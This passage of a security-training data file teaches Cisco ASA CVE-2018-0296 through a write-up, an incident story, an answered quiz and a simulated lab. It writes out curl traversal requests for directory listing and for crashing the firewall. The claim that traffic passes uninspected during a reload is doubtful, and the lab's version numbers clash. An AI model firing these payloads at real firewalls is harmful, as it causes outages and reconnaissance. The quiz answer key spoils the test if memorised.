      technical: {
        title: "URL-Encoded Path Traversal Crash and Directory Disclosure — CVE-2018-0296 Mechanics",
        body: [
          "The Cisco ASA web interface served management UI and WebVPN portal content under special URL prefixes: `/+CSCOE+/` and `/+CSCOT+/`. The URL path handling code resolved these prefixes and then processed the remainder of the path. When the URL contained percent-encoded characters — `%2F` (forward slash) or `%2E%2E` (period, enabling `../` traversal) — the URL decoder expanded these before the path routing logic ran. This decoding order allowed an attacker to construct paths that, after decoding, traversed above the intended URL root. Supplying `..%2F..%2F..%2F..%2F` after the prefix decoded to `../../../../` and returned directory listing data for filesystem paths that should have been inaccessible. The DoS variant — `%2E%2E%2F%2E%2E%2F%2E%2E%2F` to the `/+CSCOT+/` handler — triggered a NULL pointer dereference in the URL handler when the resolved path matched no expected handler pattern, crashing the HTTPS process and forcing a device reload.",
          "The dual nature of the vulnerability — information disclosure and denial of service in the same request — made it particularly effective as a reconnaissance and disruption tool. The directory listing revealed the ASA's installed modules, VPN plugins, cached sessions, and configuration structure, enabling an attacker to map the device's capabilities before launching targeted follow-up attacks. The DoS variant created a 3-minute outage window: during reload, all ACLs and NAT rules were suspended, all active VPN sessions were terminated, and traffic flowed through the perimeter without inspection — a brief but real gap in security enforcement that could be exploited for follow-on operations.",
        ],
        codeExample: {
          label: "CVE-2018-0296 — ASA path traversal for directory listing and DoS crash",
          code: `# ── STEP 1: Confirm ASA web interface is accessible ──────────────────────
curl -k -o /dev/null -s -w "%{http_code}" https://ASA_IP/+CSCOE+/logon.html
# 200 → WebVPN/ASDM interface accessible

# ── STEP 2: Directory listing via URL-encoded traversal ───────────────────
curl -k 'https://ASA_IP/+CSCOE+/..%2F..%2F..%2F..%2F'
# Response: HTML directory listing of ASA filesystem
# Contents: /sdesktop/ /asa/ /cache/ /conf/ /scripts/ /+webvpn+/
# /scripts/ and /cache/ may contain exploitable upload endpoints or session data

# ── STEP 3: DoS — crash HTTPS process via /+CSCOT+/ traversal ────────────
curl -k 'https://ASA_IP/+CSCOT+/%2E%2E%2F%2E%2E%2F%2E%2E%2F'
# HTTPS process: NULL pointer dereference → crash → device reload
# Reload duration: ~3 minutes
# During reload: ACLs suspended, VPN sessions terminated, traffic uninspected

# ── DETECTION ─────────────────────────────────────────────────────────────
show reload
# Unexpected reloads with reason "Traceback" = likely exploitation
# Check syslog for HTTP 200 responses to /+CSCOE+/..%2F patterns

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Patch to: ASA 9.1.7.20 / 9.4.4.14 / 9.6.4.6 or later
# Restrict web UI access with ACL: http <mgmt-net> <mask> management
# Never expose ASA HTTPS management to internet-facing interfaces`,
        },
      },
      incident: {
        title: "Mass ASA Scanner Wave — Unexplained Firewall Crashes (June 2018)",
        when: "June 6, 2018 (disclosure); mass scanning within 48 hours",
        where: "Cisco ASA firewalls at enterprises globally — perimeter firewalls, data center edges",
        impact: "Unauthenticated crashes causing 3-minute network outages; directory enumeration enabling targeted follow-on attacks",
        body: [
          "Cisco disclosed CVE-2018-0296 on June 6, 2018 with emergency patches. The simplicity of exploitation — a single HTTP GET request with no authentication, no special tools, no prerequisite access — made it immediately accessible to automated scanners. Within 48 hours of the advisory, Shodan-style scanners were probing every ASA management interface reachable on the internet, sending the crafted URL and recording results. Organizations that had not patched — or had not restricted ASA management access to trusted IP ranges — began experiencing firewall crashes that initially appeared to be hardware failures or software bugs.",
          "The crashes were particularly disorienting because the ASA reload reason logged was a generic process crash — not obviously attributable to external attack without correlating HTTP access logs from before the crash. Organizations investigating repeated firewall crashes checked hardware health, power supplies, and memory — before Cisco's follow-up advisory specifically noted that CVE-2018-0296 was being actively exploited in the wild and that organizations experiencing unexplained ASA reloads should check their syslog history for the characteristic URL patterns. The Australian Cyber Security Centre (ACSC) documented multiple Australian enterprises experiencing this exact pattern: repeated mysterious ASA crashes investigated as hardware issues, later attributed to CVE-2018-0296.",
          "The incident reinforced a lesson that enterprise security teams were slow to internalize: the ASA web management interface was as much of an attack surface as any internet-facing application, and it needed to be treated accordingly. Many organizations had exposed ASDM and WebVPN on the same interface with the same IP and port, reasoning that legitimate users needed web access. The correct architecture — isolating management interfaces on a dedicated out-of-band management network accessible only from known admin IPs — was documented in Cisco hardening guides but rarely implemented. CVE-2018-0296 became a forcing function: organizations that had been deferring management plane segmentation finally implemented ACLs restricting HTTPS access to the ASA to specific management IP ranges, which would have prevented the attack entirely.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "HTTP GET with encoded path traversal", type: "attacker" },
          { label: "ASA Web Interface", sub: "improper URL path handling", type: "system" },
          { label: "Web Services Process", sub: "crash → device reload OR directory listing", type: "victim" },
          { label: "Perimeter Offline", sub: "3-minute outage + recon data", type: "result" },
        ],
      },
      timeline: [
        { year: 2018, event: "Jun: Cisco discloses CVE-2018-0296 with patches for ASA", highlight: true },
        { year: 2018, event: "Mass automated scanning begins within 48 hours of disclosure" },
        { year: 2018, event: "Multiple organizations report unexplained ASA crashes traced to exploitation" },
      ],
      keyTakeaways: [
        "Never expose ASA web management to the internet — use ACLs to restrict to management networks",
        "Directory listing on a firewall is a pre-exploitation reconnaissance goldmine",
        "A crashed firewall is a network outage — treat DoS CVEs as availability-critical",
        "Automated scanning of CVE-2018-0296 began within days — patch within hours of critical advisories",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2018-0296", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaweb" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m25-q1", type: "The Flaw", challenge: "Component.", text: "CVE-2018-0296 was a path traversal in which component of the Cisco ASA?", options: ["The ASA web interface — via /+CSCOE+/ and /+CSCOT+/ URL paths","The SSH server","The SNMP agent","The DHCP service"], correctIndex: 0, explanation: "The traversal abused the ASA WebVPN URL paths /+CSCOE+/ and /+CSCOT+/." },
        { id: "stage-m25-q2", type: "Impact", challenge: "Beyond DoS.", text: "Did CVE-2018-0296 only cause a denial of service?", options: ["No — it also enabled directory listing of the ASA filesystem (modules, VPN plugins)","Yes, DoS only","It only leaked the hostname","It had no impact"], correctIndex: 0, explanation: "Besides crashing the device, it disclosed filesystem directory contents." },
        { id: "stage-m25-q3", type: "Mechanics", challenge: "Filter bypass.", text: "What encoding technique let CVE-2018-0296 bypass naive input filters?", options: ["Percent-encoding — %2F for '/' and %2E%2E for '..' to evade literal-character checks","Base64 of the whole URL","Unicode homoglyphs only","Gzip compression"], correctIndex: 0, explanation: "URL percent-encoding of slashes and dots evaded filters looking for literal traversal characters." },
        { id: "stage-m25-q4", type: "Real World", challenge: "Scanning speed.", text: "How quickly did automated scanners begin probing for CVE-2018-0296?", options: ["Within 48 hours — mass scanning began almost immediately after the June 2018 advisory","After several years","Never","Only after a PoC in 2024"], correctIndex: 0, explanation: "Mass scanning kicked off within roughly two days of the advisory's publication." },
        { id: "stage-m25-q5", type: "Impact", challenge: "Reload effect.", text: "What happens during the ~3-minute ASA reload caused by CVE-2018-0296?", options: ["All stateful inspection, ACLs, and VPN tunnels are suspended","Nothing changes","Only logging pauses","The device speeds up"], correctIndex: 0, explanation: "During reload the firewall enforces no ACLs or VPN inspection — a security gap." },
        { id: "stage-m25-q6", type: "Defense", challenge: "Filtering done right.", text: "Why did naive character-based input filtering fail here?", options: ["Attackers encoded the traversal characters, so literal-match filters missed them","Filtering is always sufficient","The filter was too strict","Encoding is impossible"], correctIndex: 0, explanation: "Robust handling must decode/canonicalize input before validation, not match raw literals." },
        { id: "stage-m25-q7", type: "Concept", challenge: "Reload security gap.", text: "Why is a firewall reload a security concern, not just availability?", options: ["While down, the firewall isn't enforcing policy, briefly exposing the network","Reloads improve security","Policy persists during reload","It only affects uptime metrics"], correctIndex: 0, explanation: "A reloading firewall leaves a window with no inspection or ACL enforcement." },
        { id: "stage-m25-q8", type: "Defense", challenge: "Primary fix.", text: "What is the remediation for CVE-2018-0296?", options: ["Patch the ASA software and restrict web interface exposure","Disable all VPN","Add more ACLs only","Reboot more often"], correctIndex: 0, explanation: "Patching the traversal flaw and limiting web-interface exposure closes the vulnerability." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "203.0.113.10",
        hostname: "asa-5505",
        os: "Cisco ASA 9.1.7.11",
        openPorts: "443/tcp (HTTPS), 80/tcp (HTTP)",
        vulnerability: "CVE-2018-0296 — ASA URL path DoS, CVSS 8.6",
      },
      scenario: "A Cisco ASA firewall has its web interface accessible from your network. Use CVE-2018-0296 to enumerate the directory structure and then trigger a DoS reload to create a network outage window.",
      hint: "Send encoded path traversal sequences (%2F or %2E%2E) to the /+CSCOE+/ endpoint to trigger listing or crash.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Perform directory enumeration via path traversal. Run: asa-enum asa.corp.com",
        "Trigger the DoS reload via the crash variant. Run: asa-dos asa.corp.com",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2018_", label: "Mission Brief — ASA Web Interface Target" },
        { trigger: "asa-enum asa.corp.com", value: "0296_ASA_", label: "Directory Listing — Filesystem Mapped" },
        { trigger: "asa-dos asa.corp.com", value: "PATH_D0S}", label: "DoS Triggered — Firewall Reloading" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: PERIMETER SILENCE",
          "Target: Cisco ASA 9.6.4.2",
          "CVE: 2018-0296  CVSS: 8.6",
          "",
          "Path traversal: directory listing + DoS reload.",
          "Sequence: asa-enum → asa-dos → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "asa-enum": (_args: string[]) => ({
          lines: [
            "GET /+CSCOE+/..%2F..%2F..%2F..%2F",
            "Response — Directory Listing:",
            "  /sdesktop/  /asa/  /cache/  /conf/  /scripts/",
            "  /cache/stc/  /CACHE/sdesktop/  /+webvpn+/",
            "ASA filesystem structure enumerated.",
            "",
            ">> LEARN: URL-encoded traversal bypasses naive input filters",
            "   %2F is an encoded forward slash — filters checking for '/' miss it.",
            "   Directory listings reveal installed modules and VPN plugins for chained attacks.",
            "   Real ASA command: show run webvpn — view what WebVPN features are enabled.",
          ],
        }),
        "asa-dos": (_args: string[]) => ({
          lines: [
            "GET /+CSCOT+/%2E%2E%2F%2E%2E%2F%2E%2E%2F",
            "ASA web services process exception triggered.",
            "Device reloading... (estimated 3 minutes)",
            "All active VPN sessions: TERMINATED",
            "Firewall enforcement: SUSPENDED during reload",
            "Network outage window: OPEN",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: A firewall reload is a 3-minute security gap",
            "   During reload: no ACLs enforced, no VPN inspection, no stateful tracking.",
            "   Automated scanners began exploiting CVE-2018-0296 within 48 hours of disclosure.",
            "   Real ASA command: show reload — view reload reason and timestamp history.",
          ],
        }),
      },
    },
  },
];
